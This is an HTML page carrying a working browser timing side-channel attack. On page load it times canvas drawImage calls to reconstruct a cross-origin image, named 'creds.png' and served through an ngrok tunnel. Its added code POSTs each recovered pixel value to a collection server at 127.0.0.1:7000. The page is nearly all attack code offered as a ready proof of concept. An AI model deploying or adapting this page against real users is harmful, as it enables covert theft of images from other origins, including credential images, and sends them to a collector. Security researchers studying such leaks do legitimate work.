<!doctype html>
<html>

<head>
  <meta charset='utf-8'>
  <style>
    .big {
      width: calc(349px * 3);
      height: calc(26px * 3);
      /* disable anti-aliasing */
      image-rendering: pixelated;
      image-rendering: optimizeSpeed;
    }

    #scratch {
      display: none;
    }

    #heatmap {
      background: #ffb6c1;
    }
  </style>
  <script>
    let Heatmap = null
    let ScratchContext = null

    const Width = 100
    const Height = 100

    const Iters = 200

    function median(lst) {
      let sorted = lst.slice(0).sort()
      return sorted[Math.floor(sorted.length / 2)]
    }

    function zeroDelay() {
      return new Promise(resolve => setTimeout(resolve, 0))
    }

    // Fonction pour envoyer les données RGB à un serveur via POST
    async function sendPixelData(x, y, rgb) {
      // Envoie les données RGB au serveur distant
      await fetch("http://127.0.0.1:7000", {
        method: "POST",
        body: JSON.stringify({x, y, rgb}),
        headers: {"Content-Type": "application/json"}
      })
    }

    async function timePixel(image, x, y) {
      let startTime = performance.now()
      for (let j = 0; j < Iters; j++) {
        ScratchContext.drawImage(image, x, y, 1, 1, 0, 0, 1024, 1024)
      }
      /* in Chromium, the draw operations aren't actually performed
         immediately, but only after the JavaScript thread stops. we wait
         on a timeout with a duration of zero to give the browser a chance
         to do the drawing, as otherwise we'd just be measuring the time
         taken to enqueue all of the draw operations. */
      await zeroDelay()
      let endTime = performance.now()

      return endTime - startTime
    }

    function drawHeatmap(heatmap) {
      let min = Math.min(...heatmap.map(l => Math.min(...l)))
      let max = Math.max(...heatmap.map(l => Math.max(...l)))

      Heatmap.clearRect(0, 0, Width, Height)

      for (let x = 0; x < heatmap.length; x++) {
        for (let y = 0; y < heatmap[x].length; y++) {
          let color = Math.round(255 * (max - heatmap[x][y]) / (max - min))
          Heatmap.fillStyle = `rgb(${color}, ${color}, ${color})`
          Heatmap.fillRect(x, y, 1, 1)
        }
      }
    }

    async function recoverImage(image) {
      /* the first couple of measurements are always higher
         than they're supposed to be because some interpreter
         optimizations haven't kicked in yet, so we "warm up"
         the interpreter by throwing away 5 measurements. */
      for (let i = 0; i < 5; i++) {
        await timePixel(image, 0, 0)
      }

      let pixels = []

      for (let x = 0; x < Width; x++) {
        let col = []
        for (let y = 0; y < Height; y++) {
          rgb = await timePixel(image, x, y)
          col.push(rgb)

          // Envoie des données RGB au serveur via POST
          await sendPixelData(x, y, rgb);

          drawHeatmap(pixels.concat([col]));
        }
        pixels.push(col)
      }

      drawHeatmap(pixels)
    }

    function init() {
      ScratchContext = document.getElementById('scratch').getContext('2d')
      ScratchContext.imageSmoothingEnabled = false

      Heatmap = document.getElementById('heatmap').getContext('2d')
      Heatmap.imageSmoothingEnabled = false

      recoverImage(document.getElementById('target'))
    }
  </script>
</head>

<body onload='init()'>
  <p>this is what the target image looks like:</p>
  <img id='target' src='https://198e-2a01-e0a-8f3-460-2ac-4982-7c35-ff80.ngrok-free.app/creds.png' class='big'>
  <p>this is our reconstruction:</p>
  <canvas id='heatmap' class='big' width=349 height=26></canvas>
  <canvas id='scratch' width=1024 height=1024></canvas>
</body>

</html>
